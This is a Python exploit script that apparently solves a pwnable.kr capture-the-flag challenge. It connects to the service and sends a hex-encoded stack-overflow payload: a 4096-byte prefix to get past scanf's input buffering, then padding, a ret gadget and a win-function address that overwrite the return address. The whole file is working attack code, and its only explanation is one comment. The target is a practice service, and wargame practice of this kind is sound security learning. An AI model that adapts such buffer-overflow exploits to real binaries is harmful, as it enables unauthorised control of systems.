#!/usr/bin/env python3
import socket
import struct


HOST = "pwnable.kr"
PORT = 10039
RET = 0x400668
WIN = 0x4005F4


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main() -> None:
    # scanf("%d") prefetches 4096 bytes from the pipe. my_fgets then uses raw
    # read(0), so the real overflow stage must start after that stdio buffer.
    prefix = b"-1 " + b"P" * (4096 - 3)
    stage = b"A" * 56 + struct.pack("<Q", RET) + struct.pack("<Q", WIN) + b"\n"
    payload = (prefix + stage).hex().encode() + b"\n"

    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(15)
        recv_until(sock, b"payload please :")
        sock.sendall(payload)
        out = b""
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            out += chunk

    print(out.decode("utf-8", "replace"), end="")


if __name__ == "__main__":
    main()
